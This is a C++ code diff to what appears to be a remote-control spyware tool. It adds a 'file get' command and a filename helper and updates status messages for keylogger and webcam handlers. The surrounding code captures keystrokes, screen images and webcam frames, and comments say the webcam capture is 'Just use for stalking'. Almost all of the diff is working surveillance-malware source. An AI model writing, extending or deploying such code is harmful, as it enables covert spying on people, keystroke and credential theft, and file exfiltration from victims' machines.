@@ -8,6 +8,7 @@ stringstream inp, out;
 string keyloggerCapturePath = filesystem::current_path().string() + "/keylogger.txt";
 string webcamCapturePath = filesystem::current_path().string() + "/webcam.png";
 string screenCapturePath = filesystem::current_path().string() + "/screen.png";
+string requestFilePath;
 
 // Return a map of command to corresponding handler
 map<string, map<string, function<void()>>> setupHandlers() {
@@ -88,6 +89,14 @@ map<string, map<string, function<void()>>> setupHandlers() {
             "file",
             {
                 {
+                    "get",
+                    [] {
+                        inp >> requestFilePath;
+                        if (requestFilePath == "") throw bad_function_call();
+                        out << "\File was get successfully.\n\nSee more in file " << getFileName(requestFilePath) << ".\n";
+                    }
+                },
+                {
                     "copy",
                     [] {
                         string srcPath, desPath;
@@ -133,6 +142,21 @@ string getInstruction() {
         << "|                                                        |\n"
         << "o--------------------------------------------------------o\n";
     return ins.str();
+}
+
+string getFileName(const string& filePath) {
+    size_t pos1 = filePath.find_last_of('/'), pos2 = filePath.find_last_of('\\');
+    size_t pos;
+    if (pos1 == string::npos) {
+        pos = pos2;
+    }
+    else if (pos2 == string::npos) {
+        pos = pos1;
+    }
+    else {
+        pos = (pos1 > pos2) ? pos1 : pos2;
+    }
+    return filePath.substr(pos + 1);
 }
 
 void listProcesses() {
@@ -428,7 +452,7 @@ void stopKeylogger() {
     keepKeyloggerRunning = false;
     // Post a message to wake up the message loop
     PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
-    out << "\nKeylogger stopped successfully.\n\nSee more in file " << keyloggerCapturePath.substr(keyloggerCapturePath.find_last_of("/") + 1);
+    out << "\nKeylogger stopped successfully.\n\nSee more in file " << getFileName(keyloggerCapturePath) << ".\n";
     fo.close();
 }
 
@@ -442,7 +466,7 @@ void startCamera() {
     imwrite(webcamCapturePath, frame); // Just use for stalking =))
 
     if (cap->isOpened()) {
-        out << "\nWebcam opened successfully.\n\nSee more in file " << webcamCapturePath.substr(webcamCapturePath.find_last_of('/') + 1);
+        out << "\nWebcam opened successfully.\n\nSee more in file " << getFileName(webcamCapturePath) << ".\n";
     }
     else {
         out << "\nFailed to open webcam.\n";
@@ -454,7 +478,7 @@ void captureCamera() {
         Mat frame;
         *cap >> frame;
         imwrite(webcamCapturePath, frame); // Just use for stalking =))
-        out << "\nWebcam captured successfully.\n\nSee more in file " << webcamCapturePath.substr(webcamCapturePath.find_last_of('/') + 1);
+        out << "\nWebcam captured successfully.\n\nSee more in file " << getFileName(webcamCapturePath) << ".\n";
     }
     else {
         out << "\nError: Webcam is not open.\n";
@@ -469,7 +493,7 @@ void stopCamera() {
         
         cap->release();
         destroyAllWindows();
-        out << "\nWebcam closed successfully.\n\nSee more in file " << webcamCapturePath.substr(webcamCapturePath.find_last_of('/') + 1);
+        out << "\nWebcam closed successfully.\n\nSee more in file " << getFileName(webcamCapturePath) << ".\n";
     }
     else {
         out << "\nError: Webcam is not open.\n";
